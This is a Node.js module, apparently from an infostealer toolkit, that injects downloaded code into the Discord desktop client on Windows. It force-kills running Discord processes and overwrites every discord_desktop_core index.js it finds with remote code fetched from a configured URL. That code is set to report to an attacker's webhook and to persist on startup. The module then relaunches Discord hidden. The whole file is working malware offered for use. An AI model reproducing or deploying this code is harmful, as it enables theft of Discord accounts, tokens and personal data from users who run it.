const path = require("path");
const LOCAL = process.env.LOCALAPPDATA;
const glob = require("fast-glob");
const { exec, spawn, spawnSync } = require("child_process");
const runningDiscords = [];
const axios = require("axios");
const fs = require("fs");
const { discordInject, wbk } = require("../../data/Config");

async function findDiscordExe(baseDir) {
  const parent = baseDir;
  const files = fs.readdirSync(parent);

  for (const file of files) {
    if (
      file.toLowerCase().endsWith(".exe") &&
      file.toLowerCase().includes("discord")
    ) {
      const fullPath = path.join(parent, file);
      try {
        const stats = fs.statSync(fullPath);
        if (stats.isFile()) return fullPath;
      } catch {}
    }
  }
  return null;
}

async function fetchRawFromGithub(url) {
  try {
    const response = await axios.get(url);
    return response.data;
  } catch (error) {
    throw new Error(
      "Erreur lors du téléchargement du fichier : " + error.message
    );
  }
}
/**
 * Inject Discord Client
 */
async function Discord() {
  try {
    await KillDiscord();

    const pattern = path
      .join(
        LOCAL,
        "*cord*",
        "app-*",
        "modules",
        "discord_desktop_core-*",
        "discord_desktop_core",
        "index.js"
      )
      .replace(/\\/g, "/");

    const matches = await glob(pattern, { onlyFiles: true, unique: true });
    if (matches.length === 0)
      return console.log("No Discord index.js files found.");

    let githubContent = await fetchRawFromGithub(discordInject);
    githubContent = githubContent
      .replace("%WEBHOOK_URL%", wbk)
      .replace("%API_URL%", "false")
      .replace("%AUTO_PROFILE%", "true")
      .replace("%AUTO_USER_PROFILE_EDIT%", "false")
      .replace("%AUTO_PERSIST_STARTUP%", "true")
      .replace("%AUTO_MFA_DISABLER%", "false");

    for (const discordPath of matches) {
      try {
        fs.writeFileSync(discordPath, githubContent, "utf-8");
        console.log(`[✓] Patched: ${discordPath}`);
        try {
          fs.mkdirSync(path.join(path.dirname(discordPath), "loudproject"));
        } catch (e) {}
        try {
          const exePath = await findDiscordExe(
            path.join(path.dirname(discordPath), "..", "..", "..")
          );
          if (exePath) {
            console.log("[→] Launching:", exePath);
            spawn(exePath, [], {
              detached: true,
              stdio: "ignore",
              windowsHide: true,
            }).unref();
          }
        } catch {}
      } catch {}
    }

    return matches;
  } catch (err) {}
}

function KillDiscord() {
  return new Promise((resolve) => {
    exec("tasklist", (err, stdout) => {
      if (stdout.includes("Discord.exe")) runningDiscords.push("Discord");
      if (stdout.includes("DiscordCanary.exe"))
        runningDiscords.push("DiscordCanary");
      if (stdout.includes("DiscordPTB.exe")) runningDiscords.push("DiscordPTB");
      if (stdout.includes("DiscordDevelopment.exe"))
        runningDiscords.push("DiscordDevelopment");

      let killCount = 0;
      if (runningDiscords.length === 0) return resolve();

      runningDiscords.forEach((disc) => {
        exec(`taskkill /IM ${disc}.exe /F`, () => {
          killCount++;
          if (killCount === runningDiscords.length) resolve();
        });
      });
    });
  });
}

module.exports = { Discord };
